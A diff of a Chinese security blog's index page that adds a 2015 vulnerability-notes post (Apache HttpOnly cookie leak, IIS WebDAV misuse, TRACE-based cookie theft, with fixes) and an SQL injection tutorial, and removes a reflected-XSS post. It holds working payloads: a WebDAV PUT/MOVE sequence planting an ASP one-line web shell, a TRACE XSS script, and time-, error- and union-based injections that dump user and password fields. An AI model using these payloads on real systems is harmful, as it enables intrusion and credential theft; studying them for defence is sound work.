@@ -194,6 +194,311 @@
           
           
             
+              <a class="post-title-link" href="/2015/08/13/漏洞记录-1/" itemprop="url">
+                漏洞记录-1
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-08-13T15:08:32+08:00" content="2015-08-13">
+            2015-08-13
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/08/13/漏洞记录-1/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/13/漏洞记录-1/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><h2 id="Apache_HTTP_Server_“httpolny”cookie_泄露">Apache HTTP Server “httpolny”cookie 泄露</h2><p>1.为了防止XSS，我们通常采用给cookie附上httponly属性，来禁止js获取cookie.</p>
+<p>2.原理：当Apache接收到了cookie长度超过4k，返回400，并且将所有的cookie信息返回，提示cookie过长.</p>
+<p>3.利用：为用户的cookie添加一些无用信息，总长超过4k，使Apache返回400，并用过js正则过滤掉无用部分，我们就绕过了httponly的设置.</p>
+<p>4.修复：受影响的版本为2.21及其之前的所有版本，做好备份，升级Apache.</p>
+<h2 id="IIS_WebDav_Options_方法未禁用">IIS WebDav Options 方法未禁用</h2><p>1.WebDav是基于HTTP1.1的扩展协议，集成在window xp和IIS中，定义了除了Get，Post等一些http协议基本方法之外的一些方法例如：Option,put,move等.</p>
+<p>2.原理：使用option方法查看服务器允许哪些方法的提交，可能造成安全隐患.</p>
+<p>3.利用：<br>-使用option探测服务器信息：</p>
+<pre><code>OPTIONS/HTTP/<span class="number">1.1</span>
+Host:www<span class="class">.xxxx</span><span class="class">.com</span>
+</code></pre><p>  返回：</p>
+<pre><code>  HTTP/<span class="number">1.1</span> <span class="number">200</span> OK
+  Date:Fri,<span class="number">01</span> Jan <span class="number">2011</span> <span class="number">04</span>:<span class="number">23</span>:<span class="number">39</span> GMT
+  Server: Microsoft-IIS/<span class="number">6.0</span>
+  X-Powered-By:ASP.NET
+  MS-Author-Via:DAV
+  Content-Length:<span class="number">0</span>
+  Accept-Ranges:none
+  DASL:&lt;DAV:sql&gt;
+  DAV:<span class="number">1.2</span>
+Public:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
+Cacha-Control:<span class="keyword">private</span>
+</code></pre><p>-上传文本文件：</p>
+<pre><code>PUT<span class="regexp">/test.txt HTTP/</span><span class="number">1.1</span>
+<span class="string">Host:</span>www.xxxx.com
+Content-<span class="string">Length:</span><span class="number">26</span>
+&lt;%eval(request(<span class="string">"cmd"</span>))%&gt;
+</code></pre><p>  返回：</p>
+<pre><code>HTTP/1.1 200 OK
+  Date:Fri,01 Jan 2011 04:23:39 GMT
+  Server: Microsoft-IIS/6.0
+  X-Powered-By:ASP.NET
+location：<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>
+Allow:OPTION,TRACE,GET,HEAD,DELETE,PUT,POST,COPY,MOVE...
+//上传成功
+</code></pre><p>-通过MOVE改名(需要IIS勾选允许脚本资源访问复选框)：</p>
+<pre><code>MOVE/test<span class="class">.txt</span> HTTP/<span class="number">1.1</span>
+Host:wwww<span class="class">.xxxx</span><span class="class">.com</span>
+Destination:http:<span class="comment">//www.<span class="label">xxxx.com/webshell.asp</span></span>
+</code></pre><p>  返回：</p>
+<pre><code>HTTP/<span class="number">1.1</span> <span class="number">201</span> Created
+  Date:Fri,<span class="number">01</span> Jan <span class="number">2011</span> <span class="number">04</span>:<span class="number">23</span>:<span class="number">39</span> GMT
+  Server: Microsoft-IIS/<span class="number">6.0</span>
+  X-Powered-By:ASP.NET
+location：www.xxxx.com/webshell.asp
+Content-type:text/xml
+Content-length:<span class="number">0</span>
+<span class="comment">//修改成功</span>
+</code></pre><p>4修复：属于服务器配置不当造成的安全问题，options PUT DELETE MOVE方法如非必须请关闭.</p>
+<h2 id="TRACE_方法未禁用">TRACE 方法未禁用</h2><p>1.TRACE是HTTP协议提供的协议调试方法，发送什么请求，它会将请求原封返回.<br>可能存在的危害是能够与XSS配合获取用户httponly的cookie内容.</p>
+<p>2.原理：客户端JavaScript提出一个TRACE请求，并读取这个请求的响应，那么这段脚本就能够访问标记为HttpOnly的cookie，即使通过document.cookie属性也无法访问它们.</p>
+<p>3.利用：</p>
+<pre><code><span class="tag">&lt;<span class="title">script</span> <span class="attribute">type</span>=<span class="value">"text/javascript"</span>&gt;</span><span class="actionscript">  
+&lt;!--  
+<span class="function"><span class="keyword">function</span> <span class="title">xssTRACE</span><span class="params">()</span></span>{  
+<span class="keyword">var</span> xmlHttp=<span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);  
+xmlHttp.open(<span class="string">"TRACE"</span>,<span class="string">"http://wmjie.51.net/swords/"</span>,<span class="literal">false</span>);  
+xmlHttp.send();  
+xmlDoc=xmlHttp.responseText;  
+alert(xmlDoc);  
+}  
+<span class="comment">//--&gt;  </span>
+</span><span class="tag">&lt;/<span class="title">script</span>&gt;</span>  
+<span class="tag">&lt;<span class="title">INPUT</span> <span class="attribute">TYPE</span>=<span class="value">BUTTON</span> <span class="attribute">onClick</span>=<span class="value">"xssTRACE();"</span> <span class="attribute">VALUE</span>=<span class="value">’XSS</span> <span class="attribute">TRACE</span>’&gt;</span>
+//将如上恶意代码插入页面，一个正常用户通过这个被劫持的页面进行访问，即使是设置属性httponly的cookie也通过TRACE方法的请求，显示在返回页面中.
+</code></pre><p>4.修复：属于服务器配置不当造成的安全问题，TRACE方法，如非必须请关闭.</p>
+<h2 id="IIS短文件名泄露">IIS短文件名泄露</h2><p>1.如果网站是运行在IIS服务器上，可以通过”~”来发现一些文件和文件夹,攻击者可以发现重要的文件或者文件夹，如果这些文件或者文件夹是正规的可见文件.攻击者可以通过该途径搜集文件名称(字符长度不超过6).<br>2.原理：使用通配符<code>*</code>和<code>?</code>发送一个请求到iis,当IIS接收到一个文件路径中包含”~”的请求时，它的反应是不同的.基于这个特点，我们可以根据http的响应区分一个可用或者不可用的文件.<br>3.修复：</p>
+<ul>
+<li><p>过滤<code>~</code>字符.</p>
+</li>
+<li><p>Windows中禁用8.3格式文件名方法如下(此修改只能禁止NTFS8.3格式文件名创建,已经存在的文件的短文件名无法移除)：</p>
+<p>  cmd&gt; fsutil 8dot3name query c:<br>“c:”表示查询C盘的状态.<br>如果功能被启用，会显示类似如下的信息：</p>
+<p>  Disable8dot3 的卷状态为 0 (8dot3 名称创建已启用).<br>  NtfsDisable8dot3NameCreation 的注册表状态为默认值 2 (卷级别设置).<br>  基于以上的两个设置，在 c: 上启用 8dot3 名称创建.</p>
+</li>
+</ul>
+<p>如果在C盘上关闭这个功能，则可使用以下命令：</p>
+<pre><code>cmd&gt; fsutil <span class="number">8</span>dot3name <span class="built_in">set</span> C: <span class="number">1</span>
+<span class="comment">//0（全部启动），1（全部禁用），2（每个盘符单独设置），3（除系统盘外全部禁用）.</span>
+</code></pre><p>也可以通过修改注册表实现：</p>
+<pre><code>键：HKLM<span class="command">\SYSTEM</span><span class="command">\CurrentControlSet</span><span class="command">\Control</span><span class="command">\FileSystem</span>
+值：NTFSDisable8dot3NameCreation  类型：REG_DWORD
+</code></pre><ul>
+<li>使用waf进行防护.</li>
+</ul>
+<h2 id="会话标识别未更新">会话标识别未更新</h2><p>1.会话标识别未更新</p>
+<p>2.原理：用户的登录页面会有一个session id，登录成功后，应该使用新的session id 而不是保持登录页面的session id， 这样即使别人在网络上截获了你的登录页面的session id，仍然无法伪造客户身份进入系统.<br>如果使用同样的session id，则可能被截获并且伪造客户身份进入系统.</p>
+<p>3.修复：<br>-始终生成新的会话，供用户成功认证时登录.<br>-防止用户操纵会话标识.<br>-请勿接受用户浏览器登录时所提供的会话标识.</p>
+<h2 id="敏感信息泄露">敏感信息泄露</h2><p>1.以电话号码泄露为例</p>
+<p>2.原理：敏感信息(电话号码，内网IP)显示在了页面，源码，url地址中.</p>
+<p>3.利用：可作为进一步渗透的信息储备</p>
+<p>4.修复：此号码网站业务正常，无实际安全影响，站点可根据网站自身情况是否去除号码.</p>
+<h2 id="缺少httponly属性">缺少httponly属性</h2><p>1.会话cookie中缺少HttpOnly属性会导致攻击者可以通过程序(JS脚本、Applet等)获取到用户的cookie信息，造成用户cookie信息泄露，增加攻击者的跨站脚本攻击威胁.</p>
+<p>2.修复：<br>向所有会话cookie中添加“HttpOnly”属性.</p>
+<pre><code>Java示例：
+HttpServletResponse response2 = (HttpServletResponse)<span class="built_in">response</span>;
+response2.setHeader( <span class="string">"Set-Cookie"</span>, <span class="string">"name=value; HttpOnly"</span>); 
+
+C#示例：
+HttpCookie myCookie = <span class="keyword">new</span> HttpCookie(<span class="string">"myCookie"</span>); 
+myCookie.HttpOnly = <span class="literal">true</span>; 
+<span class="built_in">Response</span>.AppendCookie(myCookie);
+
+VB.NET示例：
+<span class="keyword">Dim</span> myCookie As HttpCookie = <span class="keyword">new</span> HttpCookie(<span class="string">"myCookie"</span>) 
+myCookie.HttpOnly = <span class="literal">True</span> 
+<span class="built_in">Response</span>.AppendCookie(myCookie) 
+</code></pre><h2 id="启用不安全的HTTP方法">启用不安全的HTTP方法</h2><p>1.检测到目标Web服务器配置成允许下列其中一个（或多个）HTTP 方法：DELETE, SEARCH,COPY,MOVE, PROPFIND, PROPPATCH, MKCOL ,LOCK ,UNLOCK.这些方法表示可能在服务器上使用了 WebDAV.由于dav方法允许客户端操纵服务器上的文件，如果没有合理配置dav，有可能允许未授权的用户对其进行利用，修改服务器上的文件.<br>2.利用：<br>参考：</p>
+<blockquote>
+<p>IIS WebDav Options 方法未禁用</p>
+</blockquote>
+<p>3.修复：<br>如果服务器不需要支持WebDAV，请禁用.<br>或者为允许webdav的目录配置严格的访问权限，如认证方法，认证需要的用户名，密码.</p>
+<h2 id="目标web应用表单密码类型输入启用了自动完成操作">目标web应用表单密码类型输入启用了自动完成操作</h2><p>1.在web应用form表单中，如果input标签没有指定“autocomplete”属性为“off”，则“autocomplete”的属性会自动默认为“on”.<br>当web应用form表单中的密码类型的input标签的“autocomplete”属性为“on”时，用户若提交了一个新的用户名和密码时，浏览器将会询问用户是否保存该用户名和密码信息.<br>如果用户选择保存，则之后在显示该web应用表单时，用户名和密码将会被自动填充到对应的输入框中.<br>用户一但保存密码，攻击者就可以通过本地从浏览器缓存中获取明文密码，导致用户敏感信息泄露.</p>
+<p>2.修复：<br>修改web应用form表单中密码类型input标签的“autocomplete”属性为“off”.</p>
+<p>示例：</p>
+<pre><code>&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"password"</span> name=<span class="string">"password"</span>&gt;
+则增加“autocomplete”属性为“off”即可，修改为：
+&lt;input <span class="class"><span class="keyword">type</span></span>=<span class="string">"password"</span> name=<span class="string">"password"</span> autocomplete=<span class="string">"off"</span>&gt;
+</code></pre></span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
+              <a class="post-title-link" href="/2015/08/13/SQL注入练级攻略-5-5种注入方式/" itemprop="url">
+                SQL注入练级攻略(5)-5种注入类型
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-08-13T09:42:10+08:00" content="2015-08-13">
+            2015-08-13
+          </time>
+        </span>
+
+        
+          <span class="post-category" >
+            &nbsp; | &nbsp; 分类于
+            
+              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                <a href="/categories/SLQ注入练级系列/" itemprop="url" rel="index">
+                  <span itemprop="name">SLQ注入练级系列</span>
+                </a>
+              </span>
+
+              
+              
+
+            
+          </span>
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/08/13/SQL注入练级攻略-5-5种注入方式/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/13/SQL注入练级攻略-5-5种注入方式/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><h2 id="基于布尔的盲注">基于布尔的盲注</h2><pre><code>mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>;
+mysql&gt; <span class="keyword">select</span> username <span class="keyword">from</span> admin <span class="keyword">where</span> id = <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span>;<span class="comment">//根据返回内容的真假判断是否存在注入</span>
+</code></pre><h2 id="基于时间的盲注">基于时间的盲注</h2><pre><code>mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(length<span class="params">(user)</span>&gt;<span class="number">10</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
+mysql&gt; select username from admin where id = <span class="number">1</span> or <span class="keyword">if</span><span class="params">(ascii<span class="params">(mid<span class="params">(lower<span class="params">(user<span class="params">()</span>)</span>)</span>,<span class="number">1</span>,<span class="number">1</span>)</span>=<span class="number">114</span>,sleep<span class="params">(<span class="number">3</span>)</span>,<span class="number">0</span>)</span>;
+<span class="comment">//如果if中条件成立返回延时.</span>
+<span class="comment">//BENCHMARK(100000,SHA1('true'))替代sleep(3)，前者在mysql 4/5适用，后者在mysql 5 适用.</span>
+</code></pre><h2 id="基于报错的注入">基于报错的注入</h2><p>-rand和group的冲突</p>
+<pre><code>mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat(left(<span class="built_in">rand</span>(),<span class="number">3</span>),version())x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x)b;
+
+mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="built_in">where</span> user=<span class="string">"test"</span> <span class="built_in">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(*),concat_ws(<span class="string">":"</span>,user(),version(),<span class="built_in">floor</span>(<span class="built_in">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.<span class="built_in">tables</span> <span class="built_in">group</span> <span class="keyword">by</span> x) b);
+
+<span class="comment">//x的语句为:concat_ws(":",user(),version(),floor(rand(0)*2)),rand()是不允许放在group by之后的所以用group by x 之后报错 显示出 user，version信息</span>
+</code></pre><p>遇到的问题：<br>1.如果想用报错注入显示database()信息时，不能为NULL，必须使用use databasename；选择一个数据库。<br>2.注意上述语句中使用 union 和 and 的区别 一个括号。<br>3.floor(rand(0)x2)其中乘以三乘以4都是可以的，2是一个习惯用法。<br>4.除了floor(rand(0)x3)，使用left(rand(),3)之类不确定的数值跟在group by之后也是可以报错的。</p>
+<p>-extractvalue注入</p>
+<pre><code>mysql&gt; <span class="keyword">select</span> user <span class="keyword">from</span> mysql.user <span class="keyword">where</span> user=<span class="string">"test"</span> <span class="function">and <span class="title">extractvalue</span>(<span class="params"><span class="number">1</span>, concat(<span class="number">0x7e</span>,@@version</span>))</span>;
+<span class="comment">//0x7e对应 ~</span>
+</code></pre><p>说明：<br>1.extractvalue函数是用来获取xml中的数据extractvalue(pram1,pram2)<br>2.在pram2的部分正常情况下应该填写路径，在这里我们构造了extractvalue(1, concat(0x7e,@@version))，系统报错显示了我们构造部分的内容<br>3.获取内容有长度限制,最长32位。</p>
+<p>-UpdateXML()注入</p>
+<pre><code>mysql&gt; select <span class="keyword">user</span> <span class="keyword">from</span> mysql.<span class="keyword">user</span> where <span class="keyword">user</span>=<span class="string">"test"</span> and updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(SELECT distinct concat(<span class="number">0</span>x23,<span class="keyword">user</span>,<span class="number">0</span>x3a,password,<span class="number">0</span>x23) FROM <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">0</span>x7e),<span class="number">1</span>);
+//<span class="number">0</span>x7e对应 ~
+mysql&gt; select <span class="keyword">user</span> <span class="keyword">from</span> mysql.<span class="keyword">user</span> where <span class="keyword">user</span>=<span class="string">"test"</span> and updatexml(<span class="number">1</span>,a,<span class="number">1</span>);//上述语句简化
+
+//a的值为concat(<span class="number">0</span>x7e,(SELECT concat(<span class="number">0</span>x23,<span class="keyword">user</span>,<span class="number">0</span>x3a,password,<span class="number">0</span>x23) FROM <span class="keyword">user</span> <span class="keyword">limit</span> <span class="number">1</span>))
+//对应的也可以替换为concat(<span class="number">0</span>x7e,@@version,<span class="keyword">user</span>(),database())
+</code></pre><p>说明：<br>1.UpdateXML(1,a,1)是一个使用不同的XML标记匹配和替换XML块的函数.<br>2.在a的部分添加目标内容~~如上代码.<br>3.获取内容有长度限制,最长32位。</p>
+<h2 id="联合查询注入">联合查询注入</h2><p>绕过了union和select基本就可以干所有的事情了<br>1.最基本的查询其他内容    </p>
+<pre><code>mysql&gt; <span class="keyword">select</span> id <span class="keyword">from</span> admin2 <span class="built_in">union</span> <span class="built_in">all</span> <span class="keyword">select</span> username <span class="keyword">from</span> admin;
+</code></pre><p>2.猜解字段数：</p>
+<pre><code>mysql&gt; select * from admin where id = <span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5.</span>..from admin;
+<span class="comment">//知道返回正常就说明有几个字段</span>
+</code></pre><p>3.猜解字段</p>
+<pre><code>mysql&gt; select * from admin where id = <span class="number">1</span> <span class="keyword">union</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,username,<span class="number">5.</span>..from admin
+<span class="comment">//猜解username字段是否存在</span>
+</code></pre><h2 id="堆查询注入">堆查询注入</h2><p>PHP使用PDO_MYSQL来连接数据库，便可以使用堆查询，堆查询可以同时执行多个语句。</p>
+<pre><code>mysql&gt; <span class="keyword">select</span> @@version;<span class="function"><span class="keyword">select</span> <span class="title">database</span>(<span class="params"></span>)</span>;
+mysql&gt; <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> user=root and <span class="number">1</span>=<span class="number">0</span>; <span class="function">insert <span class="title">into</span> (<span class="params">username,password</span>) <span class="title">VALUES</span> (<span class="params"><span class="string">'BobbyTables'</span>, <span class="string">'kl20da$$'</span></span>)</span>;
+<span class="comment">//可以同时执行多个语句</span>
+</code></pre><p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
+</span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
               <a class="post-title-link" href="/2015/08/12/SQL注入练级攻略-4-数据库常量及函数/" itemprop="url">
                 SQL注入练级攻略(4)-数据库常量及函数
               </a>
@@ -1707,236 +2012,6 @@ git <span class="keyword">push</span>                   <span class="preprocesso
 
 
     
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/10/反射型xss/" itemprop="url">
-                反射型XSS(心伤的瘦子)
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-10T10:47:07+08:00" content="2015-08-10">
-            2015-08-10
-          </time>
-        </span>
-
-        
-          <span class="post-category" >
-            &nbsp; | &nbsp; 分类于
-            
-              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                <a href="/categories/XSS漏洞/" itemprop="url" rel="index">
-                  <span itemprop="name">XSS漏洞</span>
-                </a>
-              </span>
-
-              
-              
-
-            
-          </span>
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/10/反射型xss/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/10/反射型xss/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><h2 id="1-查看&lt;_/_&quot;等字符的过滤情况如果没有，直接X-">1.查看<code>&lt; / &quot;</code>等字符的过滤情况如果没有，直接X.</h2><p><a href="http://www.wooyun.org/bugs/wooyun-2010-015957" target="_blank" rel="external"> 什么都没过滤的入门情况</a></p>
-<h2 id="2-考虑用&amp;#x的形式代替，如果没有过滤&amp;_#_理论上可以代替任意字符，但是一般都会将&amp;过滤为&amp;amp-">2.考虑用<code>&amp;#x</code>的形式代替，如果没有过滤<code>&amp; #</code> 理论上可以代替任意字符，但是一般都会将&amp;过滤为<code>&amp;amp</code>. </h2><p><a href="http://www.wooyun.org/bugs/wooyun-2010-015959" target="_blank" rel="external">输出在<code>&lt;script&gt;&lt;/script&gt;</code>之间的情况</a>//这里构造的代码没懂<br><a href="http://www.wooyun.org/bugs/wooyun-2010-015963" target="_blank" rel="external">输出在HTML属性里的情况</a></p>
-<h2 id="3-gbXXXX系列的可以考虑使用宽字符%c0杀掉双引号，可能是因为过滤的正则写的有问题-">3.gbXXXX系列的可以考虑使用宽字符<code>%c0</code>杀掉双引号，可能是因为过滤的正则写的有问题.</h2><p><a href="http://www.wooyun.org/bugs/wooyun-2010-015969" target="_blank" rel="external">宽字节复仇记 [QQ邮箱基本通用]</a></p>
-<h2 id="4-`location-href=”………”+”&amp;ss=aaaa\”+”&amp;from==1;function_from(){}//“+”&amp;param=”;">4.`location.href=”………”+”&amp;ss=aaaa\”+”&amp;from==1;function from(){}//“+”&amp;param=”;</h2><p>如上所示代码：<br>1用\来闭合双引号,//注视掉后面代码<br>2将=改为==提高优先级<br>3可是在解析时浏览器提示from未声明，浏览器会优先解析function XXX(){} 的JS函数，添加如上代码<br>4发现空格被过滤掉了用/**/代替空格 </p>
-<h2 id="5-反斜线">5.反斜线</h2><p><a href="http://www.wooyun.org/bugs/wooyun-2010-015979" target="_blank" rel="external">反斜线复仇记</a></p>
-<h2 id="6-换行符">6.换行符</h2><pre><code><span class="number">5</span>.输出出现在注释中使用换行符<span class="escape">`%</span><span class="number">0</span><span class="literal">a</span><span class="escape">` </span>来使之后的代码生效。\.
-</code></pre><p><a href="http://www.wooyun.org/bugs/wooyun-2010-016003" target="_blank" rel="external">换行符复仇记</a></p>
-<h2 id="7-前面知识的综合应用">7.前面知识的综合应用</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//cgi</span>.data.tech.qq.com/<span class="keyword">index</span>.php?mod=search&amp;type=data&amp;site=digi&amp;libid=<span class="number">2</span>&amp;curpage=<span class="number">1</span>&amp;pagenum=<span class="number">30</span>&amp;filterattr=<span class="number">138</span>,<span class="number">138</span>|<span class="number">16</span>|<span class="number">4</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">5</span>&amp;filtervalue=<span class="number">3500</span>-<span class="number">4000</span>,<span class="variable">%B4</span><span class="variable">%F3</span><span class="variable">%D3</span><span class="variable">%DA4000</span>|<span class="variable">%D0</span><span class="variable">%FD</span><span class="variable">%D7</span><span class="variable">%AA</span>|WCDMA,WCDMA,HSDPA,HSDPA&amp;tplname=centersearch.shtml&amp;orderby=aaaa<span class="variable">%c0</span><span class="variable">%5c</span><span class="variable">%0aalert</span>(<span class="number">1</span>);<span class="regexp">//</span></span><br></pre></td></tr></table></figure>
-<p>目标参数orderby</p>
-<pre><code><span class="number">1</span>.使用换行符<span class="escape">`%</span><span class="number">0</span><span class="literal">a</span><span class="escape">`使</span>JS代码生效
-<span class="number">2</span>.使用反斜线<span class="escape">`%</span><span class="number">5</span>c<span class="escape">`解</span>决语法错误，但是发现\被过滤为\\
-<span class="number">3</span>.使用宽字符<span class="escape">`%</span>c0<span class="escape">`杀</span>掉一个反斜线最终保留一个反斜线，成功构造如上代码
-</code></pre><p>以上资料来自<a href="http://www.wooyun.org/whitehats/%E5%BF%83%E4%BC%A4%E7%9A%84%E7%98%A6%E5%AD%90" target="_blank" rel="external">心伤的瘦子</a>@<a href="http://www.wooyun.org" target="_blank" rel="external">乌云</a></p>
-</span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/07/mysql使用记录总结/" itemprop="url">
-                MySql用户及字符集操作
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-07T17:47:50+08:00" content="2015-08-07">
-            2015-08-07
-          </time>
-        </span>
-
-        
-          <span class="post-category" >
-            &nbsp; | &nbsp; 分类于
-            
-              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                <a href="/categories/杂七杂八/" itemprop="url" rel="index">
-                  <span itemprop="name">杂七杂八</span>
-                </a>
-              </span>
-
-              
-              
-
-            
-          </span>
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/07/mysql使用记录总结/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/07/mysql使用记录总结/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><p>MySql中添加用户,新建数据库,用户授权,删除用户,修改密码(注意每行后边都跟个;表示一个命令语句结束):</p>
-<h2 id="1-新建用户">1.新建用户</h2><p>登录MYSQL：</p>
-<pre><code><span class="built_ins">cmd</span>&gt;mysql -u root -p
-<span class="built_ins">cmd</span>&gt;密码
-</code></pre><p>创建用户：</p>
-<pre><code>mysql&gt; insert into mysql.user<span class="params">(Host,User,Password)</span> values<span class="params">(<span class="string">"localhost"</span>,<span class="string">"test"</span>,password<span class="params">(<span class="string">"1234"</span>)</span>)</span>;
-</code></pre><p>这样就创建了一个名为：test 密码为：1234 的用户。<br>注意：此处的”localhost”，是指该用户只能在本地登录，不能在另外一台机器上远程登录。如果想远程登录的话，将”localhost”改为”%”，表示在任何一台电脑上都可以登录。也可以指定某台机器可以远程登录。<br>然后登录一下：</p>
-<pre><code>mysql&gt;<span class="flow">exit</span>;
-<span class="built_in">cmd</span>&gt;mysql -u test -p
-<span class="built_in">cmd</span>&gt;输入密码
-mysql&gt;登录成功
-</code></pre><h2 id="2-为用户授权">2.为用户授权</h2><p>授权格式：</p>
-<pre><code><span class="operator"><span class="keyword">grant</span> 权限 <span class="keyword">on</span> 数据库.* <span class="keyword">to</span> 用户名@登录主机 <span class="keyword">identified</span> <span class="keyword">by</span> <span class="string">"密码"</span>;</span>　
-</code></pre><p>登录MYSQL（有ROOT权限），这里以ROOT身份登录：</p>
-<pre><code><span class="built_ins">cmd</span>&gt;mysql -u root -p
-<span class="built_ins">cmd</span>&gt;密码
-</code></pre><p>首先为用户创建一个数据库(testDB)：</p>
-<pre><code>mysql&gt;create database <span class="built_in">test</span>DB;
-</code></pre><p>授权test用户拥有testDB数据库的所有权限（某个数据库的所有权限）：</p>
-<pre><code>mysql&gt;grant all privileges <span class="function_start"><span class="keyword">on</span></span> testDB.* <span class="keyword">to</span> test@localhost identified <span class="keyword">by</span> '<span class="number">1234</span>';
-mysql&gt;flush privileges;  刷新系统权限表
-格式：grant 权限 <span class="function_start"><span class="keyword">on</span></span> 数据库.* <span class="keyword">to</span> 用户名@登录主机 identified <span class="keyword">by</span> <span class="string">"密码"</span>;　
-</code></pre><p>如果想指定部分权限给一用户，可以这样来写:</p>
-<pre><code>mysql&gt;grant <span class="keyword">select</span>,update <span class="keyword">on</span> testDB<span class="built_in">.</span>* <span class="keyword">to</span> test@localhost identified <span class="keyword">by</span> <span class="string">'1234'</span>;
-</code></pre><p>　　mysql&gt;flush privileges; 刷新系统权限表</p>
-<p>授权test用户拥有所有数据库的某些权限： </p>
-<pre><code>mysql&gt;grant select,<span class="built_in">delete</span>,<span class="keyword">update</span>,create,<span class="keyword">drop</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> test@<span class="string">"%"</span> identified by <span class="string">"1234"</span>;
-//test用户对所有数据库都有select,<span class="built_in">delete</span>,<span class="keyword">update</span>,create,<span class="keyword">drop</span> 权限。
